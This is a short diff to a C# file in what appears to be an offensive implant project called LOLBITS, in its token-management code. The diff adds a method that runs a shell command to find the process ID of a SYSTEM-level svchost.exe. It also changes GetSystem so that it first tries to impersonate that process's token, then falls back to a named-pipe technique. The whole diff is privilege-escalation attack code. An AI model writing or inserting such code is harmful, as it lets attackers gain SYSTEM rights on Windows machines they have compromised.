@@ -101,8 +101,24 @@ namespace LOLBITS.TokenManagement
             return false;
         }
 
-        public static bool GetSystem()
+        private int getSystemPID()
         {
+            string cmd = "FOR /F \"tokens=1,2,3,4,5\" %A in ('\"query process system | findstr svchost.exe | findstr/n ^^| findstr /b \"^1:\"\"') DO echo %E | findstr /b /r \"[0-9]\"";
+            string pid = Utils.ExecuteCommand(cmd);
+            string[] spl = pid.Split('\n');
+
+            return int.Parse(spl[2]);
+        }
+
+        public bool GetSystem()
+        {
+
+
+            int pid = getSystemPID();
+
+            if (Impersonate(pid))
+                return true;
+
             _pipeName = Jobs.RandomString(7);
             var exit = false;
             var server = new Thread(ServerThread);
